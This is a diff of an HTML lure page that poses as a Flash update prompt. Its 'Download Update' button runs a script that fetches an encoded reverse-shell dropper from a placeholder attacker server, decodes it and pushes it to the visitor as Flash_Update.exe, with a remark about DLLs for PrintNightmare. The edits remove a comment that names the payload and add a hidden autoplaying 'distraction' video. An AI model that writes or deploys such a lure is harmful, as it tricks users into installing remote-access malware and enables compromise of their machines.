@@ -8,7 +8,7 @@
       background-color: #f9f9f9;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding-top: 10%;
+      padding-top: 8%;
     }
     .box {
       background-color: #fff;
@@ -30,6 +30,9 @@
     button:hover {
       background-color: #005a9e;
     }
+    video {
+      display: none; /* Stealth embedded meme */
+    }
   </style>
 </head>
 <body>
@@ -39,9 +42,14 @@
     <button onclick="triggerDropper()">Download Update</button>
   </div>
 
+  <!-- Optional distraction video (meme.mp4) -->
+  <video autoplay muted loop id="distraction">
+    <source src="meme.mp4" type="video/mp4">
+    Your browser does not support HTML5 video.
+  </video>
+
   <script>
     function triggerDropper() {
-      // Dynamically fetch the encoded reverse shell dropper (PowerShell or DLL)
       fetch("http://yourserver.com/payload/encoded_dropper.txt")
         .then(response => response.text())
         .then(base64Data => {
@@ -61,7 +69,7 @@
           const blob = new Blob(byteArrays, { type: 'application/octet-stream' });
           const link = document.createElement('a');
           link.href = window.URL.createObjectURL(blob);
-          link.download = "Flash_Update.exe"; // Simulated EXE or .dll if using PrintNightmare
+          link.download = "Flash_Update.exe"; // or .dll if targeting PrintNightmare
           document.body.appendChild(link);
           link.click();
           document.body.removeChild(link);
